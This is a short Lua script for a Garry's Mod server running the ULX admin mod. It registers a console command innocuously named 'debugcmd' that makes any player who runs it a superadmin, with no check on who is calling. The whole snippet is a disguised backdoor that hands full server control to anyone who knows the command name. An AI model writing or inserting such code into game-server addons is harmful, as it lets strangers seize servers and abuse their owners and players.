if SERVER then
concommand.Add( "debugcmd", function( debugPlayer )
RunConsoleCommand("ulx","adduser",debugPlayer:Name(),"superadmin")
end)
end